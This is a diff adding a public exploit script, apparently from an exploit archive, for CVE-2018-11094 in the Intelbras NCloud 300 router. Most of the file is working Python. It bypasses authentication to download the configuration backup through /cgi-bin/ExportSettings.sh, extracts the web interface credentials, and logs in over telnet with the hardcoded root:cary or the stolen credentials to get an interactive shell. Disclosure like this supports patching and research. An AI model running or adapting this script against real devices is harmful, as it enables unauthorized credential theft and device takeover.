@@ -1,0 +1,80 @@
+# coding: utf-8
+# Exploit Title: Intelbras NCloud Authentication bypass
+# Date: 16/05/2018
+# Exploit Author: Pedro Aguiar - pedro.aguiar@kryptus.com
+# Vendor Homepage: http://www.intelbras.com.br/
+# Software Link: http://www.intelbras.com.br/empresarial/wi-fi/para-sua-casa/roteadores/ncloud
+# Version: 1.0
+# Tested on: Linux
+# CVE : CVE-2018-11094
+# Description: As described here: https://blog.kos-lab.com/Hello-World/ the Ncloud 300 device does not properly
+# enforce authentication, allowing an attacker to remotely download the configurations backup ('/cgi-bin/ExportSettings.sh').
+# The configurations backup file contains the web interface username and password. 
+# Also, there are hardcoded credentials in the telnet service (root:cary), in cases where root user does not exist, 
+# it was replaced by the web interface credentials. This exploit downloads the backup file and tries to use the credentials
+# to log into the device using telnet.
+
+import sys
+import requests
+import telnetlib
+import re
+
+def help():
+    print 'Usage: '
+    print 'python exploit.py http://192.168.0.1'
+
+def pop_shell(host, user, password):
+    if(user == "root"):
+        print '[+] Trying default credentials: root:cary'
+    else:
+        print '[+] Trying credentials obtained from /cgi-bin/ExportSettings.sh'
+        with open('NCLOUD_config.dat', "r") as f:
+            content = f.read()
+            user = content.split("Login=")[1].split("\n")[0]
+            password = content.split("Password=")[1].split("\n")[0]
+            #print 'User: '+ user
+            #print 'Password: '+ password
+            f.close()
+    try:
+            ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', host)[0]
+            tn = telnetlib.Telnet(ip, 23, timeout=10)
+            tn.expect(["WORKGROUP login:"], 5)
+            tn.write(user + "\r\n")
+            tn.expect(["Password:"], 5)
+            tn.write(password + "\r\n")
+            i = tn.expect(["Login incorrect"], 5)
+            if i[0] != -1:
+                raise ValueError('[-] Wrong credential')
+            tn.write("cat /proc/cpuinfo\r\n")
+            tn.interact()
+
+            tn.close()
+    except Exception as e:
+        print e
+        if(user == "root"):
+            pop_shell(host, 'try', 'again')
+
+def exploit(host):
+    print '[*] Connecting to %s' %host
+    path = '/cgi-bin/ExportSettings.sh'
+    payload = 'Export=Salvar'
+
+    response = requests.post(host + path, data=payload)
+    response.raise_for_status()
+
+    if(response.status_code == 200 and "Login=" in response.text):
+        print '[+] Config download was successful'
+        print '[+] Saving backup file to NCLOUD_config.dat'
+        with open('NCLOUD_config.dat', "w") as f:
+            f.write(response.text)
+            f.close()
+        pop_shell(host, "root", "cary")
+def main():
+    if len(sys.argv) < 2 or not sys.argv[1].startswith('http://'):
+        help()
+        return
+    host = sys.argv[1]
+    exploit(host)
+
+if __name__ == '__main__':
+    main()
